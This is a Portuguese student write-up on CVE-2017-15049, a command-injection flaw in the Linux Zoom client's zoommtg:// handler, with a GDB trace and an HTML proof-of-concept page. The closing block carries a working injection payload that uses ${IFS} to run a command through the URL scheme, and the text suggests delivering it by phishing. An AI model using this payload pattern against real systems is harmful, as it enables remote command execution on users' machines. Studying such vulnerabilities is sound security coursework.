
# Trabalho realizado na Semana #3

# [CVE-2017-15049](https://nvd.nist.gov/vuln/detail/CVE-2017-15049)

## Identificação

- Este é um problema de segurança que ocorreu com a aplicação **Zoom Client** para Linux, este bug foi descoberto em 17/12/2017.
- A vulnerabilidade permitiu que uma pessoa mal-intencionada injetasse comandos maliciosos em um computador usando o [Zoom](https://zoom.us/).    
- O [Exploit](https://www.exploit-db.com/exploits/43354) para a vulnerabilidade CVE-2017-15049 está disponível no site do Exploit-DB.
- Afetada por esta vulnerabilidade está uma função desconhecida do arquivo ZoomLauncher do componente zoommtg:/ Scheme Handler.

## Catalogação

- Autor e Autor do reporting: [Conviso](https://www.convisoappsec.com/) (empresa), o seu nível de gravidade é: **8.8** no "National Institute of Standards and Technology"
- O bug foi descoberto em 17/12/2017. A weakness foi apresentada em 19/12/2017 como postagem confirmada da lista de discussão (Divulgação Completa). É possível ler o comunicado em [seclists.org](https://seclists.org/) .
- O sistemas operacionais afetados são: Linux mais propriamente a distribuição Debian, logo sistemas como ubuntu foram afetados.
- A vulnerabilidade foi corrigida na versão 2.0.1 ou superior do Zoom Client.

## Exploit

- O ataque pode ser lançado remotamente **(RCE)**. O exploit não precisa de nenhuma forma de autenticação. Todos os detalhes técnicos e também um exploit são conhecidos.
- Resumidamente, o exploit é um tipo de Remote Code Execution (RCE) no aplicativo Zoom que injeta um payload malicioso na variável $rsi, passada como argumento para a função system() na chamada de uma função do zoom. Esse payload injeta um código malicioso em uma página HTML que é aberta pelo aplicativo Zoom. 
- Este exploit teria alta impacto na sociedade pois o zoom é um aplicativo muito utilizado para reuniões online, e com este exploit seria possível que um invasor pudesse ter acesso a uma reunião online e assim ter acesso a informações confidenciais.
- A vulnerabilidade foi tratada como uma exploração não pública de dia zero por pelo menos 2 dias. Durante esse tempo, o preço subterrâneo estimado era de cerca de 5 mil a 25 mil dolares americanos.

## Ataques

- Felizmente não foram encontrados relatos de ataques bem-sucedidos usando essa vulnerabilidade talvez porque tenha sido alertado a tempo.
- A vulnerabilidade poderia permitir que um invasor execute comandos maliciosos em uma máquina comprometida, o que pode resultar em: Perda de dados, roubo de informações e outras atividades maliciosas.
- Para prevenir estes ataques poderiamos utilizar o [Zoom](https://zoom.us/) em sistemas operacionais que não sejam Linux, ou então poderiamos atualizar o aplicativo para a versão mais recente.
- Uma das maneiras que podiamos utilizar este exploit podemos usar técnicas de engenharia social ou phishing para obter acesso a um sistema alvo e, em seguida, explorar essa vulnerabilidade injetando comandos maliciosos na linha de comando do aplicativo ZoomLauncher.


**Possivel Exploit**
```shell
  gef>  r '$(uname)'
    Starting program: /opt/zoom/ZoomLauncher '$(uname)'
    ZoomLauncher started.
    cmd line: $(uname)
    $HOME = /home/user

    Breakpoint 5, 0x0000000000401e1f in startZoom(char*, char*) ()
    gef>  x/3i $pc
    => 0x401e1f <_Z9startZoomPcS_+744>:     call   0x4010f0 <strcat@plt>
       0x401e24 <_Z9startZoomPcS_+749>:     lea    rax,[rbp-0x1420]
       0x401e2b <_Z9startZoomPcS_+756>:     mov    rcx,0xffffffffffffffff
    gef>  x/s $rdi
    0x7fffffffbf10: "export SSB_HOME=/home/user/.zoom; export QSG_INFO=1; export
    LD_LIBRARY_PATH=/opt/zoom;/opt/zoom/zoom \""
    gef>  x/s $rsi
    0x7fffffffd750: "$(uname) "
    gef>  c
    Continuing.
    export SSB_HOME=/home/user/.zoom; export QSG_INFO=1; export
    LD_LIBRARY_PATH=/opt/zoom;/opt/zoom/zoom "$(uname) "

    Breakpoint 6, 0x0000000000401e82 in startZoom(char*, char*) ()
    gef>  x/3i $pc
    => 0x401e82 <_Z9startZoomPcS_+843>:     call   0x401040 <system@plt>
       0x401e87 <_Z9startZoomPcS_+848>:     mov    DWORD PTR [rbp-0x18],eax
       0x401e8a <_Z9startZoomPcS_+851>:     mov    eax,DWORD PTR [rbp-0x18]
    gef>  x/s $rdi
    0x7fffffffbf10: "export SSB_HOME=/home/user/.zoom; export QSG_INFO=1; export
    LD_LIBRARY_PATH=/opt/zoom;/opt/zoom/zoom \"$(uname) \""

    --- RCE POC ---
    <html>
        <head>
        </head>
        <body>
            <h1>Zoom POC RCE</h1>
            <script>
                window.location = 'zoommtg://$(gnome-calculator${IFS}-e${IFS}1337)'
            </script>
        <body>
    </html>
    ``` 
